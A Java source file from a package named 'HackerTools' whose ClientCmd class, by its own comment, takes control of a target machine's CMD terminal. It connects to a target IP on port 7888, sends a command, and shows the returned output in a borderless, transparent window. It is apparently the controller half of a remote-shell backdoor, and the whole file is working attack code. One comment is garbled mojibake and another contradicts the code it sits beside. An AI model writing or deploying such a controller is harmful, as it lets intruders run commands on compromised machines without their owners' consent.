package HackerTools;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Socket;
import java.net.UnknownHostException;

/**
 * 获取并控制目标机CMDos终端
 * */
public class ClientCmd {
    static String ipaddress = null;
    static int commandport = 7888;
    static String cmd = null;

    public ClientCmd(int port, String ipaddress, String cmd) {
        // TODO Auto-generated constructor stub
        if (port != 0)
            this.commandport = port;
        this.cmd = cmd;
        this.ipaddress = ipaddress;
    }

    public void recieveresult() throws UnknownHostException, IOException {
        @SuppressWarnings("resource")
        Socket commandSocket = new Socket(ipaddress, commandport);

        DataOutputStream out = new DataOutputStream(
                commandSocket.getOutputStream());
        out.writeUTF(cmd);

        InputStreamReader commandStreamrReader = new InputStreamReader(
                commandSocket.getInputStream(), "GBK");
        BufferedReader commandReader = new BufferedReader(commandStreamrReader);

        StringBuilder commandStringBuilder = new StringBuilder();
        String line;
        try {
            while ((line = commandReader.readLine()) != null) {
                System.out.println(line);
                commandStringBuilder.append(line + "\n");
            }
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        final JFrame commandJFrame = new JFrame();
        commandJFrame.setBounds(0, 0, 700, 500);
        commandJFrame.setLocationRelativeTo(null);
        commandJFrame.setLayout(null);
        commandJFrame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
        JTextArea commandjtextarea = new JTextArea();
        commandjtextarea.setLocation(0,0);

        line = commandStringBuilder + "";
        commandjtextarea.setText(line);

        // 创建一个带有滚动条的panel

        JScrollPane panel = new JScrollPane(commandjtextarea);
        panel.setVerticalScrollBarPolicy
                (JScrollPane.VERTICAL_SCROLLBAR_ALWAYS);
        panel.setHorizontalScrollBarPolicy
                (JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
        panel.setPreferredSize(new Dimension(700, 500));
        panel.setBounds(0,30, 700, 470);

        commandJFrame.add(panel);

        // 创建关闭按钮
        JButton button_close = new JButton();
        button_close.setText("X");
        Font f = new Font("宋体", Font.PLAIN, 18);
        button_close.setFont(f);
        button_close.setBounds(640, 0, 50, 30);
        button_close.setFocusPainted(false);// 锟斤拷锟矫诧拷锟斤拷锟狡斤拷锟斤拷
        commandJFrame.add(button_close);

        button_close.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                // TODO Auto-generated method stub
                commandJFrame.dispose();
            }
        });
        commandJFrame.setUndecorated(true);//取消边框
        commandJFrame.setBackground(new Color(0,0,0,0));//设置背景透明
        commandJFrame.setVisible(true);//设置不可见

        out.close();
        commandReader.close();
        commandSocket.close();//关闭socket连接
    }
}
